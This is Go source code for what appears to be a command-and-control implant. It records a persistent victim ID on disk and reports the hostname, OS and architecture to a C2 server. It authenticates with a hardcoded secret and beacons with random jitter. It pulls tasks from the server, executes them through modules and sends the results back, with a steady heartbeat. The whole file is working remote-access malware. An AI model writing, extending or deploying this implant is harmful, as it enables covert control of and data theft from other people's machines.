package main


import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
	"BFimplant/modules"
	"github.com/google/uuid"
)

type Implant struct {
	C2ServerURL string
	Secret      string
	ImplantID   string
	JWTToken    string
	Modules     map[string]modules.Module
}

type Task struct {
	TaskID    string   `json:"task_id"`
	ImplantID string   `json:"implant_id"`
	TaskType  string   `json:"task_type"`
	Command   string   `json:"cmd"`
	Data      []byte   `json:"data"`
}


func NewImplant(c2ServerURL string) *Implant {
	ImplantID := Get_id()
	return &Implant{
		C2ServerURL: c2ServerURL,
		Secret:      "e7bcc0ba5fb1dc9cc09460baaa2a6986",
		ImplantID:   ImplantID,
		Modules:     make(map[string]modules.Module),
	}
}

func (i *Implant) Start() {
	
	if err := i.sendOSInfo(); err != nil {
		fmt.Println("Error sending OS info:", err)
		return
	}


	if err := i.login(); err != nil {
		fmt.Println("Error logging in:", err)
		return
	}
	go i.sendHeartbeat()
	i.Beaconing()

}

func (i *Implant) sendOSInfo() error {
	osInfo := map[string]string{
		"implant_id": i.ImplantID,
		"os":         runtime.GOOS,
		"os_version": getOSVersion(),
		"arch":       runtime.GOARCH,
		"hostname":   getHostname(),
	}

	data, err := json.Marshal(osInfo)
	if err != nil {
		return fmt.Errorf("error marshaling OS info: %v", err)
	}

	_,_, err = i.sendHTTPRequest("POST", "/config", data, false)
	
	return err
}

func (i *Implant) login() error {
	loginData := map[string]string{
		"implantID": i.ImplantID,
		"secret":    i.Secret,
	}

	data, err := json.Marshal(loginData)
	if err != nil {
		return fmt.Errorf("error marshaling login data: %v", err)
	}

	resp,body, err := i.sendHTTPRequest("POST", "/login", data, false)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	var response struct {
		AccessToken string `json:"access_token"`
	}
	
	_ = json.Unmarshal(body, &response)
	

	i.JWTToken = response.AccessToken
	return nil
}

func (i *Implant) Beaconing() {

	fmt.Println("Implant started with ID:", i.ImplantID)
	for {
		var Timer = time.Duration((rand.ExpFloat64() / 0.5) * float64(time.Second)) // random time between 0 and 5 seconds
		tasks, err := i.fetchTasks()
		if err != nil {
			time.Sleep(Timer)
			continue
		}


		for _, task := range tasks {
			fmt.Println("Task:", task)

			_, err := i.executeTask(task)
			if err != nil {
				fmt.Println("Error executing task:", err)
				// Handle error sending response or retry logic if needed
			} else {
				fmt.Println("Task execution response:")
			}
		}

		// Sleep for a while before fetching the next set of tasks
		time.Sleep(Timer)
	}
}

func (i *Implant) fetchTasks() ([]Task, error) {

	resp,body, err := i.sendHTTPRequest("GET", "/tasks", nil, true)

	if err != nil {
		return nil, fmt.Errorf("error fetching tasks: %v", err)
	}
	defer resp.Body.Close()
	var tasks []Task
	err = json.Unmarshal(body, &tasks)
	if err != nil {
		return nil, fmt.Errorf("error decoding tasks: %v", err)
	}
	return tasks, nil
}

func (i *Implant) executeTask(task Task) (string, error) {
	moduleName := task.TaskType
	module, found := i.Modules[moduleName]
	if !found {
		return "", fmt.Errorf("module %s not found", moduleName)
	}

	// Execute module command
result, err := module.Execute(task.Command,nil)
	if err != nil {
		return "", fmt.Errorf("error executing module %s: %v", moduleName, err)
	}

	// Send response to C2 server
	responseData := map[string]string{
		"implant_id": i.ImplantID,
		"task_id":      task.TaskID,
		"result":    result,
		"timestamp": time.Now().Format(time.RFC3339),
	}
	responseDataBytes, err := json.Marshal(responseData)
	if err != nil {
		return "", fmt.Errorf("error marshaling response data: %v", err)
	}

	_,_, err = i.sendHTTPRequest("POST","/results", responseDataBytes,true)
	if err != nil {
		return "", fmt.Errorf("error sending task response: %v", err)
	}

	return result, nil
}

func (i *Implant) sendHTTPRequest(method, path string, data []byte, includeToken bool) (*http.Response, []byte, error) {
	url := i.C2ServerURL + path
	req, err := http.NewRequest(method, url, bytes.NewBuffer(data))
	if err != nil {
		return nil,nil, fmt.Errorf("error creating HTTP request: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")
	if includeToken && i.JWTToken != "" {
		req.Header.Set("Authorization", "Bearer "+i.JWTToken)
	}

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil, nil,fmt.Errorf("error sending HTTP request: %v", err)
	}
	body, _ := io.ReadAll(resp.Body)
	
	return resp, body,nil
}


func Get_id() string {
	filePath := ""
	switch runtime.GOOS {
	case "linux":
		filePath= "/home/enigma/id.txt"
	case "windows":
		filePath= "C:\\Users\\Public\\Documents\\id.txt"
	}

	id, err := os.ReadFile(filePath)
	if err == nil {
		return string(id)
	}

	implantID := uuid.New().String()
	if err := os.WriteFile(filePath, []byte(implantID), 0644); err != nil {
		fmt.Println("Error writing implant ID to file:", err)
	}
	return implantID
}

func getHostname() string {
	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println("Error getting hostname:", err)
		return "unknown"
	}
	return hostname
}

func getOSVersion() string {
	var cmd *exec.Cmd

	switch runtime.GOOS {
	case "linux":
		cmd = exec.Command("cat", "/etc/os-release")
	case "windows":
		cmd = exec.Command("cmd", "ver")
	case "darwin":
		cmd = exec.Command("sw_vers")
	default:
		return "Unknown OS"
	}

	var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return fmt.Sprintf("Error getting OS version: %v", err)
	}

	return out.String()
}

func (i *Implant) sendHeartbeat() {
    for {
        var _,_,err = i.sendHTTPRequest("GET","/heartbeat",nil,true)
        if err != nil {
            fmt.Printf("Failed to send heartbeat: %v", err)
        }
        time.Sleep(10 * time.Second)
    }
}